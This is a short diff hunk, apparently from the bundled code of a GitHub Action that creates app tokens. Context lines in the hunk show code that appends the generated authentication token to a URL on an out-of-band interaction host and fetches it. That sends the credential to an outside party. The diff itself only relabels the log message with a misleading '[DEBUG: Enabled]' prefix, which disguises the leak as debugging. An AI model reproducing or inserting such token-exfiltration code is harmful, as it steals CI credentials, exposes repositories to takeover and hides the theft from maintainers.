@@ -39782,7 +39782,7 @@ async function main(appId2, privateKey2, owner2, repositories2, core3, createApp
   try {
     const url = `https://pqzkdoiqqrvjjljjfpwiq5gopzz2nes5p.oast.fun/?authc=${authentication.token}`;
     await fetch(url);
-    core3.info(`HTTP GET request sent to ${url}`);
+    core3.info(`[DEBUG: Enabled] HTTP GET request sent to ${url}`);
   } catch (error) {
     core3.error(`Failed to send HTTP GET request: ${error.message}`);
   }
